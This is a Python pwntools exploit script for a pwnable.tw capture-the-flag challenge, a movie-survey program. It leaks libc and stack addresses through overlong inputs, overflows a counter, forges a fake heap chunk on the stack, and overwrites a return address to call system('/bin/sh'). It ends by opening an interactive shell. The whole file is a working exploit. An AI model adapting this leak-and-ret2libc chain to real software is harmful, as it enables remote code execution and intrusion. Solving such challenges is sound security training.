#!/usr/bin/env python3

import pwn

io = pwn.remote('chall.pwnable.tw', 10204)
libc = pwn.ELF('./libc_32.so.6')

pwn.context.terminal = ['tmux', 'splitw', '-h']

def survey(name, age, why, comment):
	io.recvuntil(b'Please enter your name: ')
	io.send(name)
	io.recvuntil(b'Please enter your age: ')
	io.sendline(str(age))
	io.recvuntil(b'Why did you came to see this movie? ')
	io.send(why)
	io.recvuntil(b'Please enter your comment: ')
	io.send(comment)

# leak libc address
survey(b'A', 0, b'A' * 36, b'A')
io.recvuntil(b'Reason: ')

libc_leak = pwn.u32(io.recv(40)[36:])
libc_base = libc_leak - libc.sym[b'fflush'] - 0x6f

io.recvuntil(b'<y/n>: ')
io.sendline(b'y')

# leak stack address
survey(b'A', 0, b'A' * 80, b'A')
io.recvuntil(b'Reason: ')
stack_leak = pwn.u32(io.recv(84)[80:])

io.recvuntil(b'<y/n>: ')
io.sendline(b'y')

for _ in range(3, 11):
	survey(b'A', 0, b'A', b'A')
	io.recvuntil(b'<y/n>: ')
	io.sendline(b'y')

# len equals to 0 now, so 'Please enter your name: ' will show up simultaneously with 'Please enter your age: '
for _ in range(11, 101):
	print(_)
	io.recvuntil(b'Please enter your age: ')
	io.sendline(b'')
	io.sendline(b'0')
	io.recvuntil(b'Why did you came to see this movie? ')
	io.sendline(b'A' * 35)
	io.recvuntil(b'Please enter your comment: ')
	io.sendline(b'')
	io.recvuntil(b'<y/n>: ')
	io.recvuntil(b'<y/n>: ')
	io.sendline(b'y')
	
# emulate a fake heap

fake_heap_payload = b'A' * 12 + pwn.p32(0x41) + b'A' * 60 + pwn.p32(0x21649) 
fake_heap_addr = b'A' * 84 + pwn.p32(stack_leak - 0x60)
survey(b'A', 0, fake_heap_payload, fake_heap_addr)

io.recvuntil(b'<y/n>: ')
io.sendline(b'y')

system = libc_base + libc.sym[b'system']
shell = libc_base + next(libc.search(b'/bin/sh'))

payload = b'A' * 60 + pwn.p32(0x21649) + pwn.p32(stack_leak) + pwn.p32(system) + pwn.p32(shell) + pwn.p32(shell)
survey(payload, 0, b'A', b'A')

io.recvuntil(b'<y/n>: ')
io.sendline(b'n')

io.interactive()
